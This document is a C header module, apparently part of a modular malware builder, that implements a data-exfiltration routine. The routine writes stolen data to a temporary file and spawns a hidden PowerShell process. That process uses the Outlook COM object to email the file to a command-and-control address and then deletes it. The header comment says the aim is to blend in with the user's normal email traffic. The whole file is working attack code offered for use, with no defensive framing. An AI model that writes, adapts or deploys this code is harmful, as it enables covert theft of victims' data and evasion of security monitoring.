// chunk: exfil/email_mapi
// depends: core/run_cmd
// provides: exfiltrate
// headers: windows.h
// note: Exfil via Outlook COM — sends email using installed client, blends with user email traffic

#ifndef CHUNK_EXFIL_EMAIL_MAPI
#define CHUNK_EXFIL_EMAIL_MAPI

static int exfiltrate(const char *data, int len, const char *c2_host, int c2_port) {
    (void)c2_port;

    char tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_path);
    char attach[MAX_PATH];
    snprintf(attach, sizeof(attach), "%s\\report_%lu.dat", tmp_path, GetTickCount());

    HANDLE hf = CreateFileA(attach, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD written;
    WriteFile(hf, data, (DWORD)len, &written, NULL);
    CloseHandle(hf);

    char ps_cmd[4096];
    snprintf(ps_cmd, sizeof(ps_cmd),
        "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
        "$o = New-Object -ComObject Outlook.Application; "
        "$m = $o.CreateItem(0); "
        "$m.To = '%s'; "
        "$m.Subject = 'Report ' + (Get-Date -Format 'yyyyMMdd'); "
        "$m.Attachments.Add('%s'); "
        "$m.Send(); "
        "Start-Sleep -Seconds 5; "
        "Remove-Item '%s' -Force\"",
        c2_host, attach, attach);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

#endif
